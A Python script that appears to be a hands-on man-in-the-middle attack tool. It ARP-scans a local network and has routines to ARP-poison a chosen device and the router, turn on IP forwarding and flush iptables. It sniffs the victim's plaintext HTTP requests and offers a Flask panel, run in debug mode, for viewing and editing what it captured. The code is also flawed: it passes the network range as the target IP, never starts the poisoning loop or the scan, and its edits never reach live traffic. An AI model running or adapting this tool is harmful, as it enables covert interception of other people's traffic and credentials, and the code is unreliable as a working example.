#!/usr/bin/env python3

import argparse
import threading
from colorama import Fore, Style
from time import strftime, localtime
from scapy.all import arp_mitm, sniff, DNS, srp, Ether, ARP, send, IP, UDP, DNSRR
from mac_vendor_lookup import MacLookup, VendorNotFoundError
import os
import platform
import ctypes
import subprocess
from netfilterqueue import NetfilterQueue
from flask import Flask, render_template_string, request, redirect, url_for

# Initialize Flask app
app = Flask(__name__)

# List to store intercepted HTTP requests
intercepted_requests = []

# Check platform and privileges
if platform.system() == "Windows":
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print(f"{Fore.RED}This script requires Administrator privileges. Please run as Administrator.{Style.RESET_ALL}")
        exit(1)
elif platform.system() == "Linux":
    if os.geteuid() != 0:
        print(f"{Fore.RED}This script requires root privileges. Please run with sudo.{Style.RESET_ALL}")
        exit(1)
else:
    print(f"{Fore.RED}Unsupported OS: {platform.system()}{Style.RESET_ALL}")
    exit(1)

parser = argparse.ArgumentParser(description='Device network sniffer')
parser.add_argument('--network', help='Network to scan (e.g., "192.168.0.0/24")', required=True)
parser.add_argument('--iface', help='Network interface to use', required=True)
parser.add_argument('--routerip', help='IP of your home router', required=True)
opts = parser.parse_args()

def arp_scan(network, iface):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network),
                 timeout=5, iface=iface, verbose=False)
    print(f'\n{Fore.RED}######## NETWORK DEVICES ########{Style.RESET_ALL}\n')
    for i in ans:
        mac = i.answer[ARP].hwsrc
        ip = i.answer[ARP].psrc
        try:
            vendor = MacLookup().lookup(mac)
        except VendorNotFoundError:
            vendor = 'unrecognized device'
        print(f'{Fore.BLUE}{ip}{Style.RESET_ALL} ({mac}, {vendor})')
    print(f'{Fore.YELLOW}0. Exit{Style.RESET_ALL} ')
    return input('\nPick a device IP: ')

class Device:
    def __init__(self, routerip, targetip, iface):
        self.routerip = routerip
        self.targetip = targetip
        self.iface = iface

    def mitm(self):
        while True:
            try:
                arp_mitm(self.routerip, self.targetip, iface=self.iface)
            except OSError:
                print('IP seems down, retrying ..')
                continue

    def capture_http(self):
        def http_pkt_callback(pkt):
            if pkt.haslayer('Raw'):
                raw_data = pkt['Raw'].load.decode(errors='ignore')
                if "POST" in raw_data or "GET" in raw_data:
                    if "Host:" in raw_data and "GET" in raw_data:
                        try:
                            host = raw_data.split("Host: ")[1].split("\r\n")[0]
                            path = raw_data.split("GET ")[1].split(" HTTP")[0]
                            url = f"http://{host}{path}"
                            intercepted_requests.append({'url': url, 'raw_data': raw_data})
                            print(f"{Fore.CYAN}Intercepted URL: {url}{Style.RESET_ALL}")
                        except Exception:
                            pass
        sniff(iface=self.iface, prn=http_pkt_callback,
              filter=f'tcp port 80 and host {self.targetip}', store=0)

    def enable_ip_forwarding(self):
        subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
        print(f'{Fore.GREEN}IP forwarding enabled!{Style.RESET_ALL}')

    def set_iptables(self):
        subprocess.call(f"iptables --flush", shell=True)
        subprocess.call(f"iptables -A FORWARD -j NFQUEUE --queue-num 0", shell=True)
        print(f'{Fore.GREEN}Iptables rules set to forward packets to NFQUEUE 0.{Style.RESET_ALL}')

    def modify_http_content(self, request_index, new_data):
        intercepted_requests[request_index]['raw_data'] = new_data
        print(f"{Fore.GREEN}HTTP request modified.{Style.RESET_ALL}")

    def sniff(self):
        while True:
            print(f'\n{Fore.GREEN}Select Your Choice:{Style.RESET_ALL}')
            print(f'1. View Intercepted HTTP Requests\n2. Modify HTTP Request\n3. Exit')
            try:
                choice = int(input(f'{Fore.BLUE}Your choice: {Style.RESET_ALL}'))
            except ValueError:
                print(f"{Fore.RED}Invalid input! Please enter a number.{Style.RESET_ALL}")
                continue
            if choice == 1:
                self.view_intercepted_requests()
            elif choice == 2:
                self.modify_http_request()
            elif choice == 3:
                print(f'{Fore.YELLOW}Exiting...{Style.RESET_ALL}')
                break
            else:
                print(f'{Fore.RED}Invalid choice, try again.{Style.RESET_ALL}')

    def view_intercepted_requests(self):
        if not intercepted_requests:
            print(f"{Fore.RED}No intercepted HTTP requests yet.{Style.RESET_ALL}")
            return
        for idx, request in enumerate(intercepted_requests):
            print(f"{Fore.YELLOW}{idx + 1}. {request['url']}{Style.RESET_ALL}")

    def modify_http_request(self):
        if not intercepted_requests:
            print(f"{Fore.RED}No intercepted HTTP requests to modify.{Style.RESET_ALL}")
            return
        self.view_intercepted_requests()
        try:
            idx = int(input(f"{Fore.BLUE}Select request to modify: {Style.RESET_ALL}")) - 1
            if 0 <= idx < len(intercepted_requests):
                new_data = input(f"{Fore.GREEN}Enter new HTTP content: {Style.RESET_ALL}")
                self.modify_http_content(idx, new_data)
            else:
                print(f"{Fore.RED}Invalid selection.{Style.RESET_ALL}")
        except ValueError:
            print(f"{Fore.RED}Invalid input.{Style.RESET_ALL}")

# Flask routes to control and display requests
@app.route('/')
def index():
    html = """
    <html>
        <head><title>HTTP Sniffer Control Panel</title></head>
        <body>
            <h1>Intercepted HTTP Requests</h1>
            <ul>
                {% for request in requests %}
                    <li>
                        <a href="{{ url_for('modify_request', request_id=loop.index0) }}">{{ request['url'] }}</a>
                    </li>
                {% else %}
                    <li>No intercepted requests yet.</li>
                {% endfor %}
            </ul>
        </body>
    </html>
    """
    return render_template_string(html, requests=intercepted_requests)

@app.route('/modify/<int:request_id>', methods=['GET', 'POST'])
def modify_request(request_id):
    if request.method == 'POST':
        new_data = request.form['new_data']
        device.modify_http_content(request_id, new_data)
        return redirect(url_for('index'))
    
    html = """
    <html>
        <head><title>Modify HTTP Request</title></head>
        <body>
            <h1>Modify HTTP Request</h1>
            <form method="post">
                <label for="new_data">New Data:</label><br>
                <textarea name="new_data" rows="10" cols="50">{{ request['raw_data'] }}</textarea><br>
                <input type="submit" value="Modify Request">
            </form>
            <br>
            <a href="{{ url_for('index') }}">Back to requests</a>
        </body>
    </html>
    """
    return render_template_string(html, request=intercepted_requests[request_id])

if __name__ == '__main__':
    device = Device(opts.routerip, opts.network, opts.iface)
    threading.Thread(target=device.capture_http).start()  # Start sniffing in background
    app.run(debug=True, use_reloader=False)  # Run Flask app
